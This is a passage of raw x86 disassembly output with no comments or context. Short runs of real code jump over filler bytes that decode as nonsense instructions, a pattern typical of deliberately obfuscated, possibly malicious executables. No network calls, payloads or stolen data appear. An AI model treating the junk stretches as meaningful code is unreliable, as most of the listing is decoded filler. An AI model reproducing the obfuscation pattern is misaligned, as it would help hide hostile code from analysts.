  40efd9:	fcomp  st(4)
  40efdb:	sbb    DWORD PTR [eax],eax
  40efdd:	add    BYTE PTR [ebx],al
  40efdf:	or     eax,0x433580
  40efe4:	mov    eax,DWORD PTR [ebp-0x28]
  40efe7:	and    DWORD PTR ds:0x4335fc,edi
  40efed:	mov    ecx,DWORD PTR [ebp-0x24]
  40eff0:	add    eax,0x3e26
  40eff5:	xor    DWORD PTR ds:0x4335a4,0x433638
  40efff:	jmp    0x40f0db
  40f004:	lock sub DWORD PTR [ecx],ebx
  40f007:	xchg   ebp,eax
  40f008:	fnstenv [ebp+0x5f206dfc]
  40f00e:	int    0xa1
  40f010:	push   ss
  40f011:	mov    ecx,0xa1133f21
  40f016:	add    BYTE PTR [eax],al
  40f018:	mov    edi,0xab000000
  40f01d:	mov    eax,0x1ec3785f
  40f022:	leave  
  40f023:	mov    bh,0xe6
  40f025:	push   ebx
  40f026:	adc    eax,0xeeb059ec
  40f02b:	int3   
  40f02c:	sub    BYTE PTR [edx+0x6f],0xd6
  40f030:	dec    ebp
  40f031:	push   edi
  40f032:	sub    BYTE PTR [edx-0x6bfb49de],bh
  40f038:	and    eax,0x3402c81a
  40f03d:	push   ss
  40f03e:	ficom  WORD PTR [ebp+edx*8+0x4c72c556]
  40f045:	push   ebp
  40f046:	xchg   ebp,eax
  40f047:	dec    edx
  40f048:	inc    edx
  40f049:	out    0x14,eax
  40f04b:	ja     0x40efd6
  40f04d:	add    BYTE PTR [ebx],cl
  40f04f:	jns    0x40f08e
  40f051:	ins    DWORD PTR es:[edi],dx
  40f052:	and    DWORD PTR [edi],0x3
  40f055:	adc    BYTE PTR [esi+0x11de135f],cl
  40f05b:	std    
  40f05c:	jne    0x40f038
  40f05e:	jecxz  0x40f098
  40f060:	es sub ch,bh
  40f063:	pop    es
  40f064:	out    dx,eax
  40f065:	int    0x76
  40f067:	cs cmp eax,0x14bdba31
  40f06d:	lods   al,BYTE PTR ds:[esi]
  40f06e:	pop    edx
  40f06f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f070:	ins    DWORD PTR es:[edi],dx
  40f071:	xlat   BYTE PTR ds:[ebx]
  40f072:	retf   
  40f073:	enter  0xc35c,0x36
  40f077:	jae    0x40f047
  40f079:	or     BYTE PTR [edi+0x493675d1],ah
  40f07f:	(bad)  
  40f080:	push   ecx
  40f081:	and    bl,BYTE PTR [esi-0x35]
  40f084:	push   cs
  40f085:	cmp    edi,DWORD PTR ds:0x49eb3535
  40f08b:	push   ss
  40f08c:	out    dx,al
  40f08d:	dec    ebp
  40f08e:	(bad)  
  40f08f:	mov    bl,0x7e
  40f091:	xlat   BYTE PTR ds:[ebx]
  40f092:	outs   dx,BYTE PTR ds:[esi]
  40f093:	in     al,0xb5
  40f095:	or     al,dh
  40f097:	into   
  40f098:	jb     0x40f0ba
  40f09a:	inc    esp
  40f09b:	aad    0xf3
  40f09d:	call   FWORD PTR [ebx+ecx*2+0x4c]
  40f0a1:	fcom   st(3)
  40f0a3:	(bad)
  40f0a7:	jno    0x40f106
  40f0a9:	ds ins DWORD PTR es:[edi],dx
  40f0ab:	add    al,0xc5
  40f0ad:	fwait
  40f0ae:	push   ds
  40f0af:	jo     0x40f07b
  40f0b1:	jb     0x40f097
  40f0b3:	imul   eax,DWORD PTR [ecx],0xffffffb7
  40f0b6:	(bad)  
  40f0b7:	test   BYTE PTR [eax],bh
  40f0b9:	stos   BYTE PTR es:[edi],al
  40f0ba:	inc    ecx
  40f0bb:	sub    BYTE PTR [edi-0x22],0xbe
  40f0bf:	retf   
  40f0c0:	aas    
  40f0c1:	mov    ss,WORD PTR [ebx+0x5f]
  40f0c4:	and    al,0x92
  40f0c6:	mov    ah,0x3f
  40f0c8:	inc    eax
  40f0c9:	and    eax,0x54527555
  40f0ce:	push   esi
  40f0cf:	mov    ebp,0x4780ced9
  40f0d4:	and    BYTE PTR [ebx],ch
  40f0d6:	aad    0x30
  40f0d8:	inc    ecx
  40f0d9:	and    al,0x98
  40f0db:	or     eax,0x5dd3
  40f0e0:	xor    DWORD PTR ds:0x433670,0x4335ec
  40f0ea:	jmp    0x40f1c6
  40f0ef:	into   
  40f0f0:	jo     0x40f113
  40f0f2:	stos   DWORD PTR es:[edi],eax
  40f0f3:	mov    edi,0x5d75cefb
  40f0f8:	add    DWORD PTR [ecx+0x74],ecx
  40f0fb:	imul   eax,ebx,0xa1d24e6f
  40f101:	add    BYTE PTR [eax],al
  40f103:	mov    edi,0xbd000000
  40f108:	jg     0x40f0f4
  40f10a:	stos   BYTE PTR es:[edi],al
  40f10b:	xchg   ebx,eax
  40f10c:	inc    eax
  40f10d:	dec    esp
  40f10e:	ret    
  40f10f:	add    ecx,0xb525d22f
  40f115:	(bad)  
  40f116:	adc    DWORD PTR [edx],ebp
  40f118:	sbb    ah,bl
  40f11a:	xor    eax,0x2486d2f1
  40f11f:	xlat   BYTE PTR ds:[ebx]
  40f120:	test   eax,0xfa592ed2
  40f125:	ins    DWORD PTR es:[edi],dx
  40f126:	pusha  
  40f127:	daa    
  40f128:	sti    
  40f129:	icebp  
  40f12a:	lea    eax,[edi]
  40f12c:	into   
  40f12d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f12e:	addr16 sub eax,0x84d240c7
  40f134:	test   esp,0xe655dd05
  40f13a:	cmp    DWORD PTR [esi-0x5161a449],0xb7af4c68
  40f144:	lds    ebx,FWORD PTR [edx+ebx*1]
  40f147:	jne    0x40f112
  40f149:	aad    0xe1
  40f14b:	shl    BYTE PTR [esi],0x68
  40f14e:	mov    esp,0x5b17b5e0
  40f153:	jo     0x40f14e
  40f155:	daa    
  40f156:	and    edx,DWORD PTR [edi]
  40f158:	(bad)  
  40f159:	std    
  40f15a:	imul   edx,DWORD PTR [ebx+0x47],0x49
  40f15e:	cdq    
  40f15f:	jmp    0x7c59da88
  40f164:	lds    ebx,FWORD PTR [ecx+0x20b7cef3]
  40f16a:	jb     0x40f1e7
  40f16c:	and    BYTE PTR [esi-0x118c84a8],bl
  40f172:	ja     0x40f1c6
  40f174:	sbb    BYTE PTR [esi+0x10],bl
  40f177:	dec    esi
  40f178:	daa    
  40f179:	xor    edi,DWORD PTR [ecx]
  40f17b:	pop    edx
  40f17c:	and    esi,0xb0a18bb0
  40f182:	add    DWORD PTR [eax],edx
  40f184:	xchg   BYTE PTR [ebx],bl
  40f186:	cmp    al,0x2a
  40f188:	mov    esi,0xa8a9f0e
  40f18d:	mov    esi,0xbe835e8f
  40f192:	pop    ds
  40f193:	rcr    ecx,cl
  40f195:	mov    ?,WORD PTR [eax+0x70]
  40f198:	(bad)
  40f19b:	icebp  
  40f19c:	je     0x40f1f7
  40f19e:	out    dx,al
  40f19f:	push   ecx
  40f1a0:	fwait
  40f1a1:	jo     0x40f13a
  40f1a3:	enter  0xc96f,0x36
  40f1a7:	cmp    BYTE PTR [edi+ebx*2+0x43c95533],dl
  40f1ae:	mov    fs,WORD PTR [eax]
  40f1b0:	icebp  
  40f1b1:	(bad)  
  40f1b2:	popf   
  40f1b3:	aam    0x52
  40f1b5:	jecxz  0x40f142
  40f1b7:	mov    edi,0xf12bbbd8
  40f1bc:	lea    edi,[ebx+0xe]
  40f1bf:	bswap  ebx
  40f1c1:	xchg   BYTE PTR [edi+0x23920f1a],dl
  40f1c7:	ror    DWORD PTR [ebx+0x4335b40d],0x0
  40f1ce:	xor    ecx,DWORD PTR ds:0x433570
  40f1d4:	mov    DWORD PTR ds:0x4335b4,ecx
  40f1da:	mov    ecx,DWORD PTR [ebp+0x8]
  40f1dd:	and    DWORD PTR ds:0x433594,0x4335d8
  40f1e7:	lea    eax,[eax+ecx*1-0x4c83]
  40f1ee:	jmp    0x40f2ca
  40f1f3:	cmp    BYTE PTR [eax],dl
  40f1f5:	test   DWORD PTR [esi-0x53],edi
  40f1f8:	(bad)  
  40f1f9:	sti    
  40f1fa:	push   esi
  40f1fb:	cmp    al,0x3a
  40f1fd:	mov    edi,0x6737d3de
  40f202:	int    0x91
  40f204:	mov    ds:0xbf0000,al
  40f209:	add    BYTE PTR [eax],al
  40f20b:	sbb    DWORD PTR [edx+0x66cebf9a],edi
  40f211:	ins    DWORD PTR es:[edi],dx
  40f212:	push   DWORD PTR [edi+0x579af511]
  40f218:	sub    eax,0x4304bad4
  40f21d:	sahf   
  40f21e:	sub    al,ch
  40f220:	mov    esi,DWORD PTR [esp+edi*1]
  40f223:	in     eax,dx
  40f224:	fisubr WORD PTR [ebx]
  40f226:	mov    esi,0xcc9fe28
  40f22b:	pop    edx
  40f22c:	jmp    0x40f205
  40f22e:	push   0xffffffc9
  40f230:	mov    bl,cl
  40f232:	aad    0x44
  40f234:	ins    BYTE PTR es:[edi],dx
  40f235:	fnstsw WORD PTR [ebx]
  40f237:	loopne 0x40f282
  40f239:	mov    ds:0x874f158a,eax
  40f23e:	mov    ebp,0x8d18bcf
  40f243:	jl     0x40f1ee
  40f245:	sub    eax,0x60934104
  40f24a:	mov    ah,0xc0
  40f24c:	and    BYTE PTR [esi],dh
  40f24e:	in     eax,dx
  40f24f:	mov    edx,0x9558d153
  40f254:	push   es
  40f255:	mov    DWORD PTR [ecx+0x66],esp
  40f258:	rcl    BYTE PTR [edx+eiz*1+0x75],cl
  40f25c:	popf   
  40f25d:	in     eax,0x4
  40f25f:	enter  0x5ad2,0xcb
  40f263:	inc    esi
  40f264:	jns    0x40f267
  40f266:	addr16 loopne 0x40f271
  40f269:	add    al,0x85
  40f26b:	test   DWORD PTR [ecx-0x7c],ebp
  40f26e:	(bad)  
  40f270:	fidivr DWORD PTR [edx]
  40f272:	out    dx,eax
  40f273:	push   0xffffffa9
  40f275:	fisub  WORD PTR [esi]
  40f277:	sub    al,0xd2
  40f279:	jbe    0x40f219
  40f27b:	inc    edx
  40f27c:	xchg   esi,eax
  40f27d:	popf   
  40f27e:	scas   eax,DWORD PTR es:[edi]
  40f27f:	sub    DWORD PTR [ecx-0x712ac47f],edx
  40f285:	cmc    
  40f286:	or     al,0xd4
  40f288:	xchg   BYTE PTR [esi],bl
  40f28a:	pop    ebp
  40f28b:	fdiv   QWORD PTR ds:0xe7a43580
  40f291:	or     BYTE PTR [esi+0x5ddf0138],ah
  40f297:	test   BYTE PTR [edi-0x4d],ah
  40f29a:	(bad)  
  40f29b:	mov    eax,ds:0x80d93a1a
  40f2a0:	push   es
  40f2a1:	in     eax,0x9a
  40f2a3:	push   cs
  40f2a4:	leave  
  40f2a5:	mov    ds:0xa5553637,al
  40f2aa:	loope  0x40f2b7
  40f2ac:	jb     0x40f286
  40f2ae:	pop    edi
  40f2af:	or     bh,BYTE PTR [ebp-0x48]
  40f2b2:	pop    ebx
  40f2b3:	mov    esi,0xfb356aa4
  40f2b8:	cmp    dh,ah
  40f2ba:	aam    0xc6
  40f2bc:	cli    
  40f2bd:	daa    
  40f2be:	sub    ah,BYTE PTR [edx-0x66]
  40f2c1:	fwait
  40f2c2:	cdq    
  40f2c3:	hlt    
  40f2c4:	adc    ah,BYTE PTR [eax+0x79941ace]
  40f2ca:	push   eax
  40f2cb:	dec    DWORD PTR ds:0x433650
  40f2d1:	jmp    0x40f3ad
  40f2d6:	cmp    DWORD PTR [eax-0x5e],eax
  40f2d9:	jns    0x40f2d6
  40f2db:	sti    
  40f2dc:	sti    
  40f2dd:	inc    eax
  40f2de:	out    dx,eax
  40f2df:	dec    edx
  40f2e0:	int    0xde
  40f2e2:	cwde   
  40f2e3:	mov    DWORD PTR [ebp+0xa35069],ebx
  40f2e9:	add    BYTE PTR [edi+0x6a000000],bh
  40f2ef:	cmp    BYTE PTR [edx],ah
  40f2f1:	push   ss
  40f2f2:	push   ss
  40f2f3:	xchg   ecx,eax
  40f2f4:	or     BYTE PTR [ebx-0x75],ah
  40f2f7:	push   esp
  40f2f8:	mov    ebx,0x3f4603e7
  40f2fd:	fidiv  WORD PTR [edx-0x1e]
  40f300:	ins    DWORD PTR es:[edi],dx
  40f301:	(bad)  
  40f303:	mov    ds:0x879e03cc,eax
  40f308:	rcl    BYTE PTR [edx],1
  40f30a:	(bad)  [ecx+0x5f]
  40f30d:	add    edx,DWORD PTR [edx]
  40f30f:	ds mov dl,0x6e
  40f312:	mov    al,0xef
  40f314:	mov    eax,ds:0x3337a932
  40f319:	add    ecx,DWORD PTR [esi+eiz*2-0x15]
  40f31d:	xor    BYTE PTR [edx],0x21
  40f320:	pop    edi
  40f321:	jmp    0x30a6:0x79e6d876
  40f328:	mov    DWORD PTR cs:[edi],eax
  40f32b:	ficomp DWORD PTR [ebp-0x7b6a6d35]
  40f331:	test   DWORD PTR [ecx+0x803341c],edx
  40f337:	inc    eax
  40f338:	sub    eax,0x6ec1ef14
  40f33d:	retf   0x2dc1
  40f340:	stc    
  40f341:	push   0x75
  40f343:	jns    0x40f2cf
  40f345:	xchg   esi,eax
  40f346:	pop    ss
  40f347:	mov    eax,0x42cdfc2b
  40f34c:	rol    DWORD PTR ds:0x974a7701,cl
  40f352:	imul   esp,DWORD PTR [eax],0x2e04979c
  40f358:	inc    edx
  40f359:	jge    0x40f336
  40f35b:	jmp    0x1982b966
  40f360:	repnz ds sub edx,eax
  40f364:	loope  0x40f358
  40f366:	mov    esp,0xa2c449f7
  40f36b:	lock and BYTE PTR [edx-0x4d],ch
  40f36f:	fimul  WORD PTR [edx+esi*1-0x390b3b4c]
  40f376:	in     al,dx
  40f377:	push   ss
  40f378:	cmp    eax,0x2db2bc2
  40f37d:	mov    esp,0xb41ca55f
  40f382:	jl     0x40f308
  40f384:	imul   DWORD PTR [ebx+0xfcee139]
  40f38a:	sbb    ah,0x47
  40f38d:	popa   
  40f38e:	inc    ebp
  40f38f:	mov    ecx,0xb2a5adcc
  40f394:	push   0xf570cf4d
  40f399:	lods   eax,DWORD PTR ds:[esi]
  40f39a:	lahf   
  40f39b:	cmp    DWORD PTR [edx-0x4a],edx
  40f39e:	cmp    ah,ch
  40f3a0:	cmc    
  40f3a1:	push   eax
  40f3a2:	pop    ss
  40f3a3:	mov    dh,0x35
  40f3a5:	cmp    edi,DWORD PTR [ecx]
  40f3a7:	mov    esi,0xdf83ef64
  40f3ac:	aad    0xe8
  40f3ae:	and    bl,al
  40f3b0:	add    BYTE PTR [eax],al
  40f3b2:	and    DWORD PTR ds:0x43359c,edx
  40f3b8:	mov    ecx,eax
  40f3ba:	cmp    DWORD PTR ds:0x433544,0x0
  40f3c1:	ja     0x40f3db
  40f3c7:	xor    DWORD PTR ds:0x433544,ebx
  40f3cd:	jmp    0x40f3db
  40f3d2:	push   DWORD PTR [ebp-0x28]
  40f3d5:	call   DWORD PTR ds:0x43c834
  40f3db:	mov    eax,DWORD PTR [ebp-0x20]
  40f3de:	or     eax,0x7844
  40f3e3:	jmp    0x40f4bf
  40f3e8:	jle    0x40f3a9
  40f3ea:	fstp   QWORD PTR [ecx-0x810423]
  40f3f0:	in     al,dx
  40f3f1:	adc    eax,DWORD PTR [esi-0x332995cd]
  40f3f7:	xor    ecx,DWORD PTR [edi]
  40f3f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3fa:	add    BYTE PTR [eax],al
  40f3fc:	mov    edi,0x90000000
  40f401:	les    esi,FWORD PTR [esi-0xb5fd9e9]
  40f407:	pop    ds
  40f408:	mov    dh,0x3b
  40f40a:	sub    edi,DWORD PTR [esi]
  40f40c:	sub    eax,0x9edabc61
  40f411:	cmovg  ecx,DWORD PTR [edi+ebx*8+0x27b9f893]
  40f419:	jnp    0x40f453
  40f41b:	and    bl,BYTE PTR ds:0xfbc9c420
  40f421:	shl    cl,cl
  40f423:	xor    DWORD PTR [eax+0x72],edi
  40f426:	popa   
  40f427:	xor    BYTE PTR [edi],bh
  40f429:	aam    0xd2
  40f42b:	mov    esi,0x79bce527
  40f430:	dec    ebp
  40f431:	test   DWORD PTR [ebx-0x24],0xafea5ce0
  40f438:	push   ebp
  40f439:	jge    0x40f480
  40f43b:	sub    ebp,esi
  40f43d:	add    al,BYTE PTR [ecx]
  40f43f:	inc    eax
  40f440:	ret    
  40f441:	(bad)  
  40f443:	pop    ebp
  40f444:	les    ebp,FWORD PTR [ecx+0x6eaef35b]
  40f44a:	fstp   TBYTE PTR [ebx+eax*8+0x48]
  40f44f:	pop    esp
  40f450:	jecxz  0x40f488
  40f452:	add    edx,DWORD PTR [ecx+0x3840510a]
  40f458:	ss shr esp,1
  40f45b:	mov    dl,0x96
  40f45d:	cmp    al,0x27
  40f45f:	aad    0x76
  40f461:	shr    DWORD PTR [ebp-0x69],0x73
  40f465:	lds    ecx,FWORD PTR [ecx+0x3f]
  40f468:	aas    
  40f469:	push   es
  40f46a:	mov    edi,DWORD PTR [edx-0x47e3c820]
  40f470:	sbb    BYTE PTR [edi],cl
  40f472:	mov    ebp,0xa56fa084
  40f477:	sub    DWORD PTR [edx+0x7a],ebp
  40f47a:	sub    dl,0x3d
  40f47d:	mov    cl,0xeb
  40f47f:	ja     0x40f489
  40f481:	nop
  40f482:	sbb    DWORD PTR ds:0x17012d5a,ecx
  40f488:	clc    
  40f489:	push   ebp
  40f48a:	mov    ebp,0x35eba48a
  40f48f:	ins    BYTE PTR es:[edi],dx
  40f490:	aam    0x8f
  40f492:	mov    edx,esp
  40f494:	repz push edx
  40f496:	mov    al,0x81
  40f498:	jnp    0x40f4c9
  40f49a:	ds leave 
  40f49c:	aaa    
  40f49d:	fcomp  QWORD PTR [ecx+0x40]
  40f4a0:	adc    DWORD PTR [esi],ebp
  40f4a2:	rcr    esp,0x4c
  40f4a5:	mov    ds:0x961a086a,eax
  40f4aa:	aam    0xa8
  40f4ac:	fld    QWORD PTR ds:0xc714d31a
  40f4b2:	cdq    
  40f4b3:	and    DWORD PTR [ebx+ebx*8-0x7fd842b9],edx
  40f4ba:	push   ebp
  40f4bb:	test   eax,eax
  40f4bd:	mul    esp
  40f4bf:	add    eax,0x67e9
  40f4c4:	xor    edx,edx
  40f4c6:	push   0x6
  40f4c8:	pop    esi
  40f4c9:	mov    edi,DWORD PTR ds:0x43352c
  40f4cf:	adc    DWORD PTR ds:0x433554,edi
  40f4d5:	div    esi
  40f4d7:	mov    edx,DWORD PTR [ebp-0x1c]
  40f4da:	xor    eax,edx
  40f4dc:	sbb    DWORD PTR ds:0x433610,0x5be3
  40f4e6:	xor    eax,0xacd
  40f4eb:	jmp    0x40f5c7
  40f4f0:	dec    esi
  40f4f1:	test   al,0x43
  40f4f3:	xchg   edi,eax
  40f4f4:	out    0xff,eax
  40f4f6:	fdivp  st(1),st
  40f4f8:	inc    edi
  40f4f9:	lahf   
  40f4fa:	sbb    al,0xde
  40f4fc:	inc    ebp
  40f4fd:	hlt    
  40f4fe:	xor    bl,BYTE PTR [edi-0x32]
  40f501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f502:	add    BYTE PTR [eax],al
  40f504:	mov    edi,0x38000000
  40f509:	pop    eax
  40f50a:	jg     0x40f4af
  40f50c:	pop    edx
  40f50d:	lods   al,BYTE PTR ds:[esi]
  40f50e:	push   ds
  40f50f:	mov    ds:0x3211cdcb,al
  40f514:	out    0xa9,eax
  40f516:	outs   dx,BYTE PTR ds:[esi]
  40f517:	iret   
  40f518:	pop    ebx
  40f519:	sub    dh,BYTE PTR [ecx-0x3fa9c9bf]
  40f51f:	mov    edi,0xf4c86d7
  40f524:	data16 jno 0x40f575
  40f527:	sub    dl,dl
  40f529:	test   eax,0xa7adf1bc
  40f52e:	cmp    ebx,DWORD PTR [ecx+0x2e]
  40f531:	pop    ebp
  40f532:	enter  0x13ad,0x42
  40f536:	and    edi,ebx
  40f538:	call   FWORD PTR [eax]
  40f53a:	sub    edx,ecx
  40f53c:	sbb    ch,al
  40f53e:	out    dx,al
  40f53f:	(bad)  
  40f540:	cwde   
  40f541:	shl    DWORD PTR ds:0x58490b1c,0x55
  40f548:	mov    al,ds:0x32d580d1
  40f54d:	jno    0x40f4e0
  40f54f:	mov    esi,0x647f16be
  40f554:	loop   0x40f592
  40f556:	xchg   esi,eax
  40f557:	sub    bh,BYTE PTR [edi+0x673ff958]
  40f55d:	mov    bh,0xf7
  40f55f:	test   eax,0x5931752
  40f564:	xor    al,0x5b
  40f566:	lods   al,BYTE PTR ds:[esi]
  40f567:	in     eax,dx
  40f568:	jae    0x40f537
  40f56a:	inc    ecx
  40f56b:	dec    edx
  40f56c:	shr    DWORD PTR [eax+0x33],1
  40f56f:	dec    esp
  40f570:	jns    0x40f59c
  40f572:	or     BYTE PTR [ecx+0x1],0xe0
  40f576:	call   FWORD PTR [edi+0x162ad036]
  40f57c:	stos   BYTE PTR es:[edi],al
  40f57d:	mov    esp,0xd3cd8005
  40f582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f583:	inc    ebp
  40f584:	dec    esp
  40f585:	add    eax,0x5704bc5c
  40f58a:	out    0x85,al
  40f58c:	dec    ebx
  40f58d:	jnp    0x40f541
  40f58f:	test   BYTE PTR [ecx],ah
  40f591:	xchg   DWORD PTR [eax+0x11],edi
  40f594:	mov    ebp,0x4874d325
  40f599:	sbb    BYTE PTR [ebx-0x66],bl
  40f59c:	test   esp,0x9e403571
  40f5a2:	sbb    ebx,0x4c702000
  40f5a8:	pop    edi
  40f5a9:	out    0x7c,eax
  40f5ab:	add    al,0xa8
  40f5ae:	adc    ch,BYTE PTR [edi+eax*1-0x779cff1d]
  40f5b5:	test   ebx,esi
  40f5b7:	mov    ch,0x74
  40f5b9:	mov    esi,0xc3f4630
  40f5be:	inc    edx
  40f5bf:	ins    DWORD PTR es:[edi],dx
  40f5c0:	push   ebp
  40f5c1:	test   al,0x36
  40f5c3:	cmp    dh,BYTE PTR [edx+ecx*2+0x24]
  40f5c7:	add    ecx,eax
  40f5c9:	adc    DWORD PTR ds:0x4335f0,edi
  40f5cf:	mov    DWORD PTR [ebp-0x4],ecx
  40f5d2:	sbb    ecx,DWORD PTR ds:0x433584
  40f5d8:	mov    DWORD PTR [ebp-0x48],0x7080
  40f5df:	adc    DWORD PTR ds:0x4335ec,ecx
  40f5e5:	mov    DWORD PTR [ebp-0x44],0x2947
  40f5ec:	jmp    0x40f6c8
  40f5f1:	aad    0x45
  40f5f3:	mov    edi,0xfdffbf07
  40f5f8:	xlat   BYTE PTR ds:[ebx]
  40f5f9:	loopne 0x40f592
  40f5fb:	push   esi
  40f5fc:	lahf   
  40f5fd:	aad    0x38
  40f5ff:	fnstcw WORD PTR [ebx+0xa58d]
  40f605:	mov    edi,0xb4000000
  40f60a:	iret   
  40f60b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f60c:	gs stos BYTE PTR es:[edi],al
  40f60e:	cwde   
  40f60f:	dec    ebx
  40f610:	mov    DWORD PTR [esi],ecx
  40f612:	bswap  edi
  40f614:	adc    BYTE PTR [eax+ecx*8-0x17af6e0c],cl
  40f61b:	push   ss
  40f61c:	repz clc 
  40f61e:	aaa    
  40f61f:	jae    0x40f5db
  40f621:	mov    dh,0x13
  40f623:	push   ds
  40f624:	add    DWORD PTR [ebx+0x7f71ffac],ebp
  40f62a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f62b:	(bad)  
  40f62c:	xchg   ebx,eax
  40f62d:	stos   BYTE PTR es:[edi],al
  40f62e:	fwait
  40f62f:	lahf   
  40f630:	repz lds ebx,FWORD PTR [esi+0x1c]
  40f634:	dec    edx
  40f635:	adc    ecx,esi
  40f637:	fscale 
  40f639:	sbb    eax,0x27e4585a
  40f63e:	dec    ebx
  40f63f:	mov    ecx,0x57108119
  40f644:	rcl    DWORD PTR [ecx+0x40fc7c16],cl
  40f64a:	aaa    
  40f64b:	mov    al,ds:0x2482d260
  40f650:	mov    eax,0x81c6a090
  40f655:	mov    eax,0xe5560bb5
  40f65a:	and    eax,0x7b825875
  40f65f:	iret   
  40f660:	jg     0x40f69d
  40f662:	dec    esi
  40f663:	in     al,dx
  40f664:	fisubr DWORD PTR [esi-0x40]
  40f667:	aas    
  40f668:	arpl   WORD PTR [ecx],si
  40f66a:	add    dl,BYTE PTR [edi]
  40f66c:	loop   0x40f6b0
  40f66e:	sub    DWORD PTR [eax-0x77cae616],0xffffffae
  40f675:	dec    esi
  40f676:	icebp  
  40f677:	push   esp
  40f678:	or     al,0x7f
  40f67a:	sub    BYTE PTR [edi],bl
  40f67c:	xchg   ecx,eax
  40f67d:	or     eax,0xa3d92b59
  40f682:	add    eax,0xf5e1343d
  40f687:	(bad)  
  40f688:	cmp    DWORD PTR [ecx+ebp*2+0x6fe8b7c7],eax
  40f68f:	inc    ebx
  40f690:	add    al,0xe6
  40f692:	test   BYTE PTR [ecx+0xfa431c3],dh
  40f698:	in     eax,0xd
  40f69a:	pop    esp
  40f69b:	push   0xffffffa4
  40f69d:	mov    bl,0x2b
  40f69f:	sahf   
  40f6a0:	fdiv   DWORD PTR [edi+0x6b6f18]
  40f6a6:	xchg   ebx,eax
  40f6a7:	or     ebp,DWORD PTR [edi+0x2f]
  40f6aa:	sub    ebp,eax
  40f6ac:	shr    esi,0x11
  40f6af:	cmp    eax,0xa141701c
  40f6b4:	(bad)  
  40f6b6:	and    eax,0xc305f80e
  40f6bb:	test   eax,0x4cfa30f8
  40f6c0:	imul   esp,DWORD PTR [edi-0x626dd151],0x45c76831
  40f6ca:	rol    dl,0x13
  40f6cd:	add    BYTE PTR [eax],al
  40f6cf:	mov    DWORD PTR [ebp-0x3c],0x70e7
  40f6d6:	cmp    DWORD PTR ds:0x433624,0x0
  40f6dd:	jb     0x40f7da
  40f6e3:	or     edi,DWORD PTR ds:0x433608
  40f6e9:	jmp    0x40f7da
  40f6ee:	push   0x433614
  40f6f3:	push   0x4e37
  40f6f8:	call   DWORD PTR ds:0x43c804
  40f6fe:	jmp    0x40f7da
  40f703:	mov    edi,0xb50bb51b
  40f708:	scas   eax,DWORD PTR es:[edi]
  40f709:	mov    edi,0x86c4ecbf
  40f70e:	int    0xa2
  40f710:	xchg   DWORD PTR [ebp+0xa64c70],edx
  40f716:	add    BYTE PTR [edi+0x61000000],bh
  40f71c:	fs aam 0x49
  40f71f:	pop    ebp
  40f720:	sbb    al,BYTE PTR cs:[ebx-0x45916bfc]
  40f727:	scas   eax,DWORD PTR es:[edi]
  40f728:	pusha  
  40f729:	xchg   edx,eax
  40f72a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f72b:	or     ah,ch
  40f72d:	jns    0x40f70d
  40f72f:	pop    edx
  40f730:	aam    0xf3
  40f732:	test   DWORD PTR [edx],ecx
  40f734:	scas   al,BYTE PTR es:[edi]
  40f735:	cmp    DWORD PTR [ebp+0x67b35ec],eax
  40f73b:	sbb    DWORD PTR [eax],esp
  40f73d:	and    DWORD PTR [esi],ebp
  40f73f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f740:	mov    cl,0xb7
  40f742:	mov    cl,bl
  40f744:	mov    bl,BYTE PTR [edx+eax*1-0x7eee5ff]
  40f74b:	cmp    ebx,DWORD PTR ds:0x481562df
  40f751:	add    BYTE PTR [edx+0x532e4999],bl
  40f757:	mov    eax,ds:0xe91f19fa
  40f75c:	shl    BYTE PTR [eax],cl
  40f75e:	cld    
  40f75f:	push   cs
  40f760:	push   ebx
  40f761:	xor    eax,0x2769a687
  40f766:	les    ebx,FWORD PTR [esp+ecx*2-0x77a8391f]
  40f76d:	xor    BYTE PTR [esi],dl
  40f76f:	test   ebx,0x94ae0006
  40f775:	and    BYTE PTR [ecx+ecx*4+0x66],0x2b
  40f77a:	add    eax,0x50af68a6
  40f77f:	cmp    al,0x32
  40f781:	jae    0x40f7f7
  40f783:	dec    ebx
  40f784:	push   ebx
  40f785:	nop    DWORD PTR [ebx+0x25a5d9e2]
  40f78c:	out    0xec,eax
  40f78e:	stos   DWORD PTR es:[edi],eax
  40f78f:	cmp    eax,0xd4c27c75
  40f794:	mov    ebx,DWORD PTR [eax-0x1]
  40f797:	jecxz  0x40f76f
  40f799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f79a:	or     eax,0xd6d3af87
  40f79f:	and    ecx,DWORD PTR [ecx-0x45]
  40f7a2:	dec    ebx
  40f7a3:	mov    bl,0x8a
  40f7a5:	mov    ah,0xf6
  40f7a7:	iret   
  40f7a8:	mov    DWORD PTR [eax-0x4fd41d91],ebp
  40f7ae:	push   es
  40f7af:	out    dx,eax
  40f7b0:	lds    edi,FWORD PTR [esp-0x2ba4eeb3]
  40f7b7:	mov    BYTE PTR [edi+0x29b4b9d4],ch
  40f7bd:	jns    0x40f7d2
  40f7bf:	add    DWORD PTR [edi-0x36704652],ecx
  40f7c5:	(bad)  
  40f7c6:	pop    ebp
  40f7c7:	sub    ch,dh
  40f7c9:	rol    bl,1
  40f7cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7cc:	push   cs
  40f7cd:	rcl    DWORD PTR [ecx+0x30],cl
  40f7d0:	aas    
  40f7d1:	jno    0x40f7b8
  40f7d3:	push   eax
  40f7d4:	dec    esi
  40f7d5:	call   DWORD PTR [edx-0x38b48d20]
  40f7db:	inc    ebp
  40f7dc:	int3   
  40f7dd:	inc    ebp
  40f7de:	popa   
  40f7df:	add    BYTE PTR [eax],al
  40f7e1:	mov    DWORD PTR [ebp-0x2c],0x70d5
  40f7e8:	mov    DWORD PTR [ebp-0x1c],0x268
  40f7ef:	mov    DWORD PTR [ebp-0x20],0x5f10
  40f7f6:	mov    DWORD PTR [ebp-0x24],0x727c
  40f7fd:	mov    DWORD PTR [ebp-0x28],0x4fa5
  40f804:	xor    edi,0x5418
  40f80a:	mov    eax,DWORD PTR [ebp-0x28]
  40f80d:	mov    ecx,DWORD PTR [ebp-0x24]
